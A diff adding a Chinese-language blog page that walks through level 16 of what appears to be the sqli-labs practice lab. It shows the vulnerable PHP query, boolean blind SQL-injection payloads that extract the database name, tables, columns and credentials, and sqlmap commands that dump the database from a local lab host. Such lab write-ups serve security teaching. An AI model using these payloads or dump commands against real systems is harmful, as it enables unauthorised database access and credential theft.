@@ -1,0 +1,53 @@
+<hr>
+<h2 id="title-less16url-https-www-yuque-com-u29002979-ep2zrx-fa4zbswybtorktcf"><a href="#title-less16url-https-www-yuque-com-u29002979-ep2zrx-fa4zbswybtorktcf" class="headerlink" title="title: less16url: https://www.yuque.com/u29002979/ep2zrx/fa4zbswybtorktcf"></a>title: less16<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/fa4zbswybtorktcf">https://www.yuque.com/u29002979/ep2zrx/fa4zbswybtorktcf</a></h2><pre><code class="bash">$uname=&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;
+$passwd=&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;; 
+@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;
+$result=mysql_query($sql);
+</code></pre>
+<p>在Less15的原题上将闭合方式变成了”) <a name="OMlVf"></a></p>
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><pre><code class="bash">判断数据库名称长度
+admin&quot;) or length(database())=8--+
+显示蓝色图片，说明数据库长度为8
+
+逐一猜解数据库名称
+admin&quot;) or ascii(substr(database(),1,1))=115--+
+第一个字符是s  ...
+
+猜解数据表名称
+admin&quot;) or ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;101 --+
+第一个字符是e ...
+
+猜解字段名称
+admin&quot;) or ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))=105--+
+第一个字符是i ...
+
+猜解字段内容
+admin&quot;) or ascii(mid((select group_concat(username,0x7e,password) from users),1,1))=68--+
+第一个字符是D ...
+</code></pre>
+<p><a name="sVerI"></a></p>
+<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p><a name="OwLMd"></a></p>
+<h2 id="burpsuite抓包"><a href="#burpsuite抓包" class="headerlink" title="burpsuite抓包"></a>burpsuite抓包</h2><pre><code class="bash">POST /Less-16/ HTTP/1.1
+Host: 192.168.31.193
+Content-Length: 24
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.31.193
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.31.193/Less-16/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+passwd=admin&amp;uname=admin
+</code></pre>
+<pre><code class="bash">sqlmap -r 1.txt -p &#39;uname&#39; --level 2 --batch
+爆破数据库
+sqlmap -r 1.txt -p &#39;uname&#39; --level 2 --batch --current-db
+爆破表
+sqlmap -r 1.txt -p &#39;uname&#39; --level 2 --batch -D security --tables
+脱库
+sqlmap -r 1.txt -p &#39;uname&#39; --level 2 --batch -D security --dump
+</code></pre>
